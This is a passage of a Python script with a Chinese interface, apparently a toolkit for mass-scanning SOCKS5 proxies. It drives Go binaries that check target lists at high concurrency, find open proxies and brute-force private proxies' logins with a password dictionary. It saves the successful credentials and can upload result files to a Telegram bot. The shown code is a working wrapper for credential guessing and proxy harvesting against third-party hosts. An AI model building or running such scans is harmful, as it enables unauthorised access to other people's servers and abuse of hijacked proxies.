        success_output_file = os.path.join(output_dir, f"{base}_auth_success.txt")
        open_proxy_output_file = os.path.join(output_dir, f"{base}_open_proxies.txt")

        print("\n扫描结果将实时打印在控制台。")
        print(f"所有成功认证的结果将保存到: {success_output_file}")
        print(f"检测到的开放代理将保存到: {open_proxy_output_file}")
        
        cmd_args = [
            "-proxyFile", proxy_file,
            "-threads", threads,
            "-timeout", timeout,
            "-dictFile", dict_file_path,
            "-outputFile", success_output_file,
            "-openFile", open_proxy_output_file
        ]
        
        run_go_executable("scanner", cmd_args)
        
    finally:
        shutil.rmtree(temp_dir_for_dict) # 清理临时目录和里面的文件

# --- 其他任务与主菜单 ---
def format_duration(seconds):
    secs = int(seconds)
    mins, secs = divmod(secs, 60)
    return f"{mins} 分 {secs} 秒"

def send_telegram_notification(config, file_path, total_targets, duration_seconds):
    token = config.get("bot_token")
    chat_id = config.get("chat_id")
    
    timestamp = datetime.now().strftime("%Y%m%d-%H%M")
    new_filename = f"Socks5-{os.path.basename(file_path)}-{timestamp}.txt"
    
    custom_key = config.get('custom_id_key', 'VPS')
    custom_value = config.get('custom_id_value', '未设置')
    
    caption = (
        f"{custom_key}: {custom_value}\n"
        f"总目标数: {total_targets}\n"
        f"总用时: {format_duration(duration_seconds)}\n"
        f"任务结果: {new_filename}"
    )
    
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    try:
        print("正在发送文件到 Telegram...")
        with open(file_path, 'rb') as f:
            files = {'document': (new_filename, f)}
            data = {'chat_id': chat_id, 'caption': caption}
            response = requests.post(url, files=files, data=data, timeout=60)
        
        response.raise_for_status()
        result = response.json()
        if result.get("ok"): print("文件发送成功！")
        else: print(f"发送失败: {result.get('description', '未知错误')}")
    except requests.exceptions.RequestException as e: print(f"发送时发生网络错误: {e}")
    except Exception as e: print(f"发生未知错误: {e}")

def prompt_and_send_telegram(config, file_path, total_targets, duration_seconds):
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
        print("\n结果文件为空或不存在，无需发送。")
        return
    
    if not config.get("bot_token") or not config.get("chat_id"):
        print("\n[!] Telegram 未配置。请在主菜单 -> [3] 设置 中配置 Bot Token 和 Chat ID 后再发送。")
        return

    choice = input(f"\n是否将结果文件 '{os.path.basename(file_path)}' 发送到 Telegram? (y/n): ").lower()
    if choice == 'y':
        send_telegram_notification(config, file_path, total_targets, duration_seconds)

def execute_scan_task(config, output_dir, mode):
    task_map = {
        "protocol": {
            "header": "验证Socks5协议 (快速)", "desc": "此模式只检查目标是否响应SOCKS5握手，不测试其可用性。",
            "threads_prompt": "并发数 (默认500): ", "threads_default": "500", "timeout_prompt": "超时(秒, 推荐5): ", "timeout_default": "5",
            "output_suffix": "_protocol_verified"
        },
        "deep": {
            "header": "扫描公共代理 (无认证)", "desc": "此功能将深度验证代理，确保其不仅是SOCKS5服务，还能实际连接到目标网站。",
            "threads_prompt": "并发数 (默认200): ", "threads_default": "200", "timeout_prompt": "超时(秒, 推荐10): ", "timeout_default": "10",
            "output_suffix": "_deep_verified"
        }
    }
    task = task_map[mode]
    print_header(task["header"]); print(task["desc"])
    
    input_file = get_validated_input("请输入原始目标文件路径: ", validate_file_exists, "文件不存在。")
    
    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            total_targets = sum(1 for line in f if line.strip())
    except Exception as e: print(f"读取文件时出错: {e}"); return
        
    if total_targets == 0: print("输入文件为空，任务取消。"); return

    threads = get_validated_input(task["threads_prompt"], lambda x: x=="" or validate_positive_integer(x), "") or task["threads_default"]
    timeout = get_validated_input(task["timeout_prompt"], lambda x: x=="" or validate_positive_integer(x), "") or task["timeout_default"]
    
    base, ext = os.path.splitext(os.path.basename(input_file))
    output_file_path = os.path.join(output_dir, f"{base}{task['output_suffix']}{ext}")
    print(f"结果将实时保存至: {output_file_path}")
    
    cmd_args = ["-inputFile", input_file, "-outputFile", output_file_path, "-threads", threads, "-timeout", timeout]
    
    start_time = time.time()
    run_go_executable(mode+"_verifier", cmd_args) # "protocol_verifier" or "deep_verifier"
    end_time = time.time()
    
    duration = end_time - start_time
    prompt_and_send_telegram(config, output_file_path, total_targets, duration)

def handle_discover_usability(config, output_dir):
    while True:
        print_header("发现可用Socks5 (深度)")
        print("  [1] 扫描公共代理 (无认证)")
        print("  [2] 扫描私有代理 (需密码本)")
        print("  [b] 返回主菜单")
        choice = input("\n请选择扫描类型: ").lower()
        if choice == '1': execute_scan_task(config, output_dir, "deep"); break
        elif choice == '2': handle_auth_scan(output_dir); break
        elif choice == 'b': break
        else: print("无效输入，请重新选择。")

def main():
    if not compile_go_binaries(): sys.exit(1)
    
    config = load_config()
    session_timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    output_dir = f"toolkit_session_{session_timestamp}"
    os.makedirs(output_dir, exist_ok=True)
    
    print("\n" + "*"*60); print(" " * 15 + "SOCKS5 验证与发现工具 (配置版)"); print(f"--- 本次会话所有输出文件将保存在: '{output_dir}' 目录 ---")
    print(f"--- 配置文件: '{CONFIG_FILE}', Go核心缓存: '{CACHE_DIR}' ---"); print("*"*60)

    while True:
        print("\n--- 主菜单 ---")
        print("  [1] 验证Socks5协议 (快速初筛)"); print("  [2] 发现可用Socks5 (深度验证)"); print("  [3] 设置"); print("  [4] 退出程序")
        choice = input("\n请输入您的选择 [1-4]: ")
        if choice == '1': execute_scan_task(config, output_dir, "protocol")
        elif choice == '2': handle_discover_usability(config, output_dir)
        elif choice == '3': handle_config_menu(config)
        elif choice == '4': print("感谢使用，再见！"); break
        else: print("无效的输入。")
        input("\n按 Enter 键返回主菜单...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n程序被用户中断。")
    except Exception as e:
        print(f"\n发生未捕获的严重错误: {e}")
    finally:
        print("程序退出。")
